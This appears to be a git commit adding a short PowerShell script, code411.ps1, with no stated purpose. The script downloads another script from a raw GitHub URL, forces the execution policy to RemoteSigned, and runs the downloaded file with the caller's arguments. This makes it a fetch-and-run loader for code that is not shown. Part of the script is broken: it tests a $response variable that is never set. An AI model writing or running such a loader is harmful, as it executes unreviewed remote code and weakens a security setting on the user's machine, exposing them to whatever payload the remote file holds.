10c12bea418e048d3c9802f7d6a6a404d729f8ca
folibony78-boop <folibony78@gmail.com>
2025-11-10 11:55:19 +0300

    Add files via upload

---
+++ code411.ps1
@@ -0,0 +1,18 @@
+
+$url = "https://raw.githubusercontent.com/folibony78-boop/cxcxz/refs/heads/main/code4.ps1"
+$output = "code43.ps1"
+ 
+if ($response.Content -match '<pre[^>]*>(.*?)</pre>') {
+    $preContent = $matches[1]
+    Write-Host "Content found in <pre> tags:"
+    Write-Host $preContent
+}
+ 
+Invoke-WebRequest -Uri $url -OutFile $output
+ 
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force
+ 
+.\code43.ps1 @args
+
+
+ 
